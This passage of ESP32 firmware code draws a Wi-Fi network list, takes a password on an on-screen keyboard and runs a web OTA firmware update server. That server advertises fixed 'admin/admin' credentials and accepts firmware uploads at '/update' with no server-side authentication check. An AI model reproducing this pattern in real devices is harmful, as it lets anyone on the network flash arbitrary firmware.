      if (x >= 10 && x < SCREEN_WIDTH - 10 && y >= y_pos && y < y_pos + NETWORK_ROW_HEIGHT) {
        char buf[64];
        char ssid[16];
        strncpy(ssid, networks[i].ssid, 11);
        ssid[11] = '\0';
        if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
        const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
        snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
        tft.setTextColor(ORANGE, TFT_BLACK);
        tft.setTextSize(1);
        tft.setCursor(10, y_pos);
        tft.println(buf);
        delay(100);
        tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE), TFT_BLACK);
        tft.setCursor(10, y_pos);
        tft.println(buf);
        selectedIndex = i;
        strncpy(selectedSSID, networks[i].ssid, 31);
        selectedSSID[31] = '\0';
        selected = true;
        break;
      }
      y_pos += NETWORK_ROW_HEIGHT;
    }

    if (fwActionPressed("Back", x, y, true)) {
      delete[] networks;
      wifiPassword[0] = '\0';
      return false;
    }
    if (fwActionPressed("Rescan", x, y, true)) {
      delete[] networks;
      return selectWiFiNetwork();
    }
    if (fwActionPressed("Prev", x, y, true) && startIndex > 0) {
      startIndex -= FW_NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (fwActionPressed("Next", x, y, true) && startIndex + FW_NETWORKS_PER_PAGE < numNetworks) {
      startIndex += FW_NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
  }

  delete[] networks;
  return true;
}

void drawNetworkList(int startIndex, int numNetworks, NetworkInfo* networks, int selectedIndex) {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  const int bodyBottom = fwContentBottom();
  tft.fillRect(0, 37, 240, bodyBottom - 37, TFT_BLACK);
  tft.setTextSize(1);

  if (numNetworks == 0) {
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No networks found.");
  } else {
    int y = 50;
    tft.setTextColor(GREEN);
    tft.setCursor(10, y);
    tft.println("Networks:");
    y += 20;

    int start_index = startIndex;
    int end_index = min(start_index + FW_NETWORKS_PER_PAGE, numNetworks);

    for (int i = start_index; i < end_index && y < 300; i++) {
      char buf[64];
      char ssid[16];
      strncpy(ssid, networks[i].ssid, 11);
      ssid[11] = '\0';
      if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
      const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
      snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
      tft.setCursor(10, y);
      tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE));
      tft.println(buf);
      y += NETWORK_ROW_HEIGHT;
    }

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", start_index / FW_NETWORKS_PER_PAGE + 1, (numNetworks + FW_NETWORKS_PER_PAGE - 1) / FW_NETWORKS_PER_PAGE);
    tft.setCursor(180, 50);
    tft.setTextColor(GREEN);
    tft.println(page_buf);
  }

  bool prevDisabled = startIndex == 0;
  bool nextDisabled = (startIndex + FW_NETWORKS_PER_PAGE) >= numNetworks;
  drawNetworkTabBar(prevDisabled, nextDisabled);
  fwEnsureToolbar();
}

bool enterWiFiPassword() {
  wifiPassword[0] = '\0';

  OnScreenKeyboardConfig cfg;
  cfg.titleLine1      = "[!] Enter the Wi-Fi password for the";
  cfg.titleLine2      = "selected network. ^ caps, # sym";
  osKeyboardUseStandardLayout(cfg);
  cfg.maxLen          = PASSWORD_MAX_LENGTH;
  cfg.shuffleNames    = nullptr;
  cfg.shuffleCount    = 0;
  cfg.buttonsY        = 195;
  cfg.backLabel       = "Back";
  cfg.middleLabel     = "Del";
  cfg.okLabel         = "OK";
  cfg.enableShuffle   = false;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg   = "Password cannot be empty!";

  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, "");

  if (!r.accepted) {

    wifiPassword[0] = '\0';
    return false;
  }

  size_t n = min((size_t)PASSWORD_MAX_LENGTH, (size_t)r.text.length());
  for (size_t i = 0; i < n; ++i) {
    wifiPassword[i] = r.text[i];
  }
  wifiPassword[n] = '\0';

  return true;
}

void performWebOTAUpdate() {
  uiDrawn = false;
  static size_t totalUploaded = 0;
  bool inUpdate = false;

  if (!selectWiFiNetwork()) {
    drawMenu();
    return;
  }

  if (!enterWiFiPassword()) {
    drawMenu();
    return;
  }

  updateStatusBar();
  runUI();
  const int bodyBottom = fwContentBottom();
  tft.fillRect(0, 37, 240, bodyBottom - 37, TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("Starting Web OTA...");
  drawTabBar("", false, "", false, "Back", false);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 30 + yshift);
  tft.println("Connecting Wi-Fi");
  fwEnsureToolbar();
  WiFi.begin(selectedSSID, wifiPassword);
  int attempts = 0;
  uint32_t lastConnectPollMs = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    const uint32_t now = millis();
    if ((uint32_t)(now - lastConnectPollMs) >= 50u) {
      lastConnectPollMs = now;
      if (featureHasTouchNavBar()) {
        maintainTouchNavBar();
      }
      if (feature_exit_requested) {
        WiFi.disconnect();
        return;
      }
      if (fwActionPressed("Back")) {
        WiFi.disconnect();
        drawMenu();
        return;
      }
      int x, y;
      if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
        WiFi.disconnect();
        drawMenu();
        return;
      }
    }
    delay(500);
    attempts++;
  }
  if (WiFi.status() != WL_CONNECTED) {
    tft.setTextColor(UI_WARN, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("X Wi-Fi failed!");
    tft.setCursor(10, 50 + yshift);
    tft.println("Touch to retry or Back");
    drawTabBar("", false, "", false, "Back", false);
    fwRestoreNavChrome();
    int x, y;
    if (waitForTouchXY(x, y)) {
      WiFi.disconnect();
      drawMenu();
      return;
    }
    performWebOTAUpdate();
    return;
  }
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 40 + yshift);
  tft.println("Wi-Fi OK");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 50 + yshift);
  tft.print("IP: ");
  tft.println(WiFi.localIP());
  tft.setCursor(10, 70 + yshift);
  tft.println("URL: http://esp32.local");
  tft.setCursor(10, 80 + yshift);
  tft.println("User: admin");
  tft.setCursor(10, 90 + yshift);
  tft.println("Pass: admin");

  if (!MDNS.begin(host)) {
    tft.setTextColor(UI_WARN, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("X mDNS failed!");
    tft.setCursor(10, 50 + yshift);
    tft.println("Touch to retry or Back");
    drawTabBar("", false, "", false, "Back", false);
    fwRestoreNavChrome();
    int x, y;
    if (waitForTouchXY(x, y)) {
      WiFi.disconnect();
      drawMenu();
      return;
    }
    performWebOTAUpdate();
    return;
  }
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 110 + yshift);
  tft.println("mDNS OK");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 120 + yshift);
  tft.println("Web server ready!");
  tft.setCursor(10, 130 + yshift);
  tft.println("Access via browser");

  server.on("/", HTTP_GET, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/html", loginIndex);
  });
  server.on("/serverIndex", HTTP_GET, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/html", serverIndex);
  });
  server.on("/update", HTTP_POST, []() {
    server.sendHeader("Connection", "close");
    bool success = !Update.hasError();
    server.send(200, "text/plain", success ? "OK" : "FAIL");
    if (success) {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setTextSize(1);
      tft.println("Update OK!");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 20 + yshift);
      tft.println("Rebooting...");
      delay(2000);
      ESP.restart();
    } else {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.println("X Update Failed!");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 20 + yshift);
      tft.println("Touch to retry or Back");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      int x, y;
      if (waitForTouchXY(x, y)) {
        server.close();
        WiFi.disconnect();
        drawMenu();
        return;
      }
      performWebOTAUpdate();
    }
  }, [&inUpdate, &totalUploaded]() {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) {
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setTextSize(1);
      tft.println("Web OTA Started...");
      drawTabBar("", false, "", false, "Back", true);
      totalUploaded = 0;
      inUpdate = true;
      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
        Update.printError(Serial);
      }
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
        Update.printError(Serial);
      }
      totalUploaded += upload.currentSize;
      int percent = (totalUploaded * 100) / (upload.totalSize ? upload.totalSize : 1000000);
      tft.fillRect(10, 30 + yshift, 220, 10, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.printf("Progress: %d%%", percent);
    } else if (upload.status == UPLOAD_FILE_END) {
      if (Update.end(true)) {
        Serial.printf("Update Success: %u\n", upload.totalSize);
      } else {
        Update.printError(Serial);
      }
      totalUploaded = 0;
      inUpdate = false;
    }
  });

  server.begin();
  fwEnsureToolbar();

  uint32_t lastInputMs = 0;
  while (true) {
    server.handleClient();
    const uint32_t now = millis();
    if ((uint32_t)(now - lastInputMs) >= 50u) {
      lastInputMs = now;
      if (featureHasTouchNavBar()) {
        maintainTouchNavBar();
      }
      if (feature_exit_requested) {
        server.close();
        WiFi.disconnect();
        return;
      }
      if (!inUpdate) {
        if (fwActionPressed("Back")) {
          server.close();
          WiFi.disconnect();
          drawMenu();
          return;
        }
        int x, y;
        if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
          server.close();
          WiFi.disconnect();
          drawMenu();
          return;
        }
      }
    }
    delay(1);
  }
}

void updateSetup() {

  fwResetNavCache();
  tft.fillScreen(TFT_BLACK);
  tft.drawFastHLine(0, 19, 240, UI_LINE);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(0);

  setupTouchscreen();

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();

  drawMenu();
}

void updateLoop() {

  if (featureHasTouchNavBar()) {
    maintainTouchNavBar();
    if (isButtonPressedEdge(BTN_LEFT)) {
      feature_exit_requested = true;
      return;
    }
  } else if (feature_active && isButtonPressed(BTN_LEFT)) {
    // Remapped layout: LEFT exits now (was SELECT).
    feature_exit_requested = true;
    return;
  }

  updateStatusBar();
  runUI();
  if (feature_exit_requested) return;

  if (fwActionPressed("Back")) {
    feature_exit_requested = true;
    delay(200);
    return;
  }

  int x, y;
  if (readTouchXY(x, y)) {
    if (fwActionPressed("Back", x, y, true)) {
      feature_exit_requested = true;
      delay(200);
      return;
    }
    if (checkButton(x, y, BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH, BUTTON_HEIGHT)) {
      performSDUpdate();
    }
    else if (checkButton(x, y, BUTTON2_X, BUTTON2_Y, BUTTON_WIDTH, BUTTON_HEIGHT)) {
      performWebOTAUpdate();
    }
    delay(200);
  }
}
}
